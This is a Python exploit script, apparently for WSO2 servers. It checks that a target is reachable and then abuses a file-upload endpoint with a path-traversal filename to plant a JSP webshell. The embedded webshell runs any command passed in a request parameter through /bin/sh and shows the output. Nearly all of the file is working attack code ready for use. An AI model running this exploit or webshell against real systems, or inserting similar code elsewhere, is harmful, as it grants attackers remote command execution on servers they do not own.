from requests import get, post, exceptions
from rich import print
from urllib3 import disable_warnings

from src.wsob.helpers.settings import props

disable_warnings()

def start(args) -> None:
    " Check if target passed is alive "

    try:
        response: str = get(args.u, **props)
        status_code: str = response.status_code
        status_error: str = f"[bold white on red][-] Host returned status code: {status_code}"

        if response.ok:
            exploit(args)
        else:
            return print(status_error)

    except exceptions as error:
        return print(f"[red]> Error when trying to connect to host: {args.u} | {error} [/]")


def exploit(args) -> None:
    " Exploit the vulnerability "

    print("\n[green][+] Connected succesfully, trying to upload JSP webshell...")

    webshell = """<%-- 
    https://github.com/jimidk 
    jim.maziashvili@gmail.com
--%>
<FORM>
    <INPUT name='cmd' style='width:70%;' type=text>
    <INPUT type=submit value='exec'>
</FORM>
<%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
    String output = "";
    String error = "";
    if(cmd != null) {
        String[] commandAndArgs = new String[]{ "/bin/sh", "-c", cmd };
        String s = null;
        Process process = Runtime.getRuntime().exec(commandAndArgs);
        InputStream inputStream = process.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
        Thread.sleep(2000);
        while(process.isAlive()) Thread.sleep(100);
        while((s = reader.readLine()) != null) { output += s+"&#13;&#10;"; }
        reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        while((s = reader.readLine()) != null) { error += s+"&#13;&#10;"; }
    }
%>

cmd: <%=cmd %><br>
output:<br>
<textarea style="width:100%; height: 50%"><%=output %></textarea>
error:<br>
<textarea style="width:100%; height: 30%"><%=error %></textarea>"""

    shell = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/cmd.jsp": webshell}
    upload = post(f"{args.u}/fileupload/toolsAny", files=shell, **props)
    status_code = upload.status_code

    if not status_code == 200:
        print("[red][-] Target is not vulnerable [/]")
    else:
        print(f"[yellow][!] Upload status code: {status_code} [/]")
        print(f"[green][+] Webshell path: {args.u}authenticationendpoint/cmd.jsp [/]")
